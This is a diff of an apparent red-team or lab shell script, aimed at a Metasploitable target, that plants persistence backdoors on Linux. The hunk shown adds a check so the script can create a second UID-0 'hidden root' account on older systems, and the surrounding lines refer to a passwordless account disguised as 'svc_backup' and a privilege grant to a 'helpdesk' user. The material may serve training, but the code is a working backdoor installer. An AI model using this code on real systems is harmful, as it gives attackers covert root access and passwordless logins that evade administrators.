@@ -30,8 +30,14 @@ NOPASS_USER="${LFA_NOPASS_USER:-svc_backup}"
 GRANT_USER="${LFA_GRANT_USER:-helpdesk}"
 
 echo "[*] 1/4 Creating a SECOND UID-0 account '$HIDDEN_ROOT' (hidden root)..."
+# Hardy's useradd (shadow 4.x, coreutils 6.10 on Metasploitable) has NO
+# -M/--no-create-home flag — passing it aborts with a usage error. Add it only
+# where supported so the "daemon-like, no home" shape survives on modern boxes
+# while Hardy just gets the account (a home dir there is harmless cosmetics).
+NOHOME=""
+if useradd --help 2>&1 | grep -q -- '-M'; then NOHOME="-M"; fi
 if ! id "$HIDDEN_ROOT" >/dev/null 2>&1; then
-    useradd -o -u 0 -g 0 -M -s /bin/bash "$HIDDEN_ROOT"
+    useradd -o -u 0 -g 0 $NOHOME -s /bin/bash "$HIDDEN_ROOT"
 fi
 
 echo "[*] 2/4 Creating a PASSWORDLESS account '$NOPASS_USER'..."
